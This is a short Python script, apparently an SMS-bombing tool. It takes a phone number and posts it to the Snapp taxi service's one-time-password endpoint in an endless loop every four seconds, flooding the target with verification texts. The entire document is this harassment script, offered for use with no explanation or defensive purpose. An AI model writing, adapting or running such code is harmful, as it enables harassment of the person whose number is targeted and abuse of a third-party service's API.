
import requests
import time

phone = input("Enter Phone number : ")
urlsend = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
mydata = {"cellphone":"+98"+phone}

while True:
    send = requests.post(urlsend,data=mydata)
    print(send)
    time.sleep(4)